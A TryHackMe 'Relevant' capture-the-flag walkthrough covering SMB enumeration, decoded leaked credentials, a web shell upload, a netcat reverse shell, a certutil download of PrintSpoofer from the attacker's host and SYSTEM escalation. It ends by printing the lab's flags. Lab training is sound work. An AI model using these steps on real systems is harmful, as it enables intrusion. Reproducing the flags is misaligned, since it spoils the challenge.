
# TryHackMe - Relevant Walkthrough

## 🔎 Nmap Scan

```bash
nmap -sC -sV -p- $target
```
### scan for TCP Ports
```bash
nmap -Pn -T4 -sS -p- -oN full_tcp_scan.txt $target
```
### scan for open ports
```bash
nmap -sC -sV -O -oN targeted_scan.txt -p 80, 135, 139, 445, 3389, 49663, 49666, 49667 $target
```
### Open Ports

- **80, 49663** → Microsoft IIS 10.0
- **135, 139, 445, 49666, 49667** → MS RPC & SMB
- **3389** → RDP
- **Vulnerable Service**: SMBv1 (CVE-2017-0143 / MS17-010)

```bash
nmap -p 445 --script smb-vuln-ms17-010 $target
```

---

## 📁 Enumerate SMB

```bash
smbclient -L //$target/ -N
```

### Shares Found:
- `ADMIN$`
- `C$`
- `IPC$`
- `nt4wrksv` ✅

```bash
smbclient \\$target\nt4wrksv
smb: \> get passwords.txt
```

### Decoded Passwords:

```bash
echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d
# Bob - !P@$$W0rD!123

echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d
# Bill - Juw4nnaM4n420696969!$$$
```

---

## ⚡ Gaining Access (Initial Shell)

### Upload Web Shell via SMB:

```bash
smbclient \\$target\nt4wrksv
smb: \> put shell.aspx
```

### Execute Shell:

```url
http://$target:49663/nt4wrksv/shell.aspx
```

### Get Reverse Shell:
Set up a listener:

```bash
nc -lvnp 4444
```

### Retrieve `user.txt`:
Found at `C:\Users\Bob\Desktop\user.txt`

```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

---

## 🧨 Privilege Escalation via PrintSpoofer

### Step 1: Download on Kali

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 80
```

### Step 2: Download on Victim

```cmd
certutil -urlcache -split -f http://10.21.183.238/PrintSpoofer64.exe PrintSpoofer64.exe
```

### Step 3: Exploit for SYSTEM Access

```cmd
PrintSpoofer64.exe -i -c cmd
```

### Step 4: Retrieve `root.txt`

Found at: `C:\Users\Administrator\Desktop\root.txt`

```
THM{1fk5kf469devly1gl320zafgl345pv}
```

---

## ✅ Flags Summary

| Flag       | Value                                  |
|------------|----------------------------------------|
| `user.txt` | `THM{fdk4ka34vk346ksxfr21tg789ktf45}`  |
| `root.txt` | `THM{1fk5kf469devly1gl320zafgl345pv}`  |

---

## 🔚 Box Complete!
